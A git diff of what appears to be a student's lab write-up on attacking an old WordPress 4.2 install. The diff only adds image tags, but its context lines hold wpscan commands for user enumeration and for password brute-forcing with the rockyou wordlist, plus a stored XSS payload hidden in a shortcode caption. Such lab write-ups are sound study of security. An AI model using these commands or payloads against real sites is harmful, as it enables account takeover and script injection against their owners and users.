@@ -11,7 +11,7 @@ Time spent: **20** hours spent in total
     - Vulnerability types: User Enumeration
     - Tested in version: 4.2
     - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: <img src="enumerate" width="800">
   - [ ] Steps to recreate: Run ```wpscan --url http://wpdistillery.vm --enumerate u``` in the Kali Linux terminal.
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -20,7 +20,7 @@ Time spent: **20** hours spent in total
     - Vulnerability types: Bruteforce
     - Tested in version: 4.2
     - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: <img src="wordlist2" width="800">
   - [ ] Steps to recreate: Run ```wpscan --url http://wpdistillery.vm --passwords /home/kali/Desktop/rockyou.txt --usernames admin``` in the Kali Linux terminal.
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
@@ -29,7 +29,7 @@ Time spent: **20** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: <img src="post" width="800">
   - [ ] Steps to recreate: On the WordPress site, add a new post and put ```<a href="[caption code="]</a><a title=" onmouseover=alert('hi') ">link</a>``` into the body of the post. Then click preview to see the result. An alert pops up after hovering the mouse over "link".
   - [ ] Affected source code:
     - [Link 1](https://core.trac.wordpress.org/browser/tags/version/src/source_file.php)
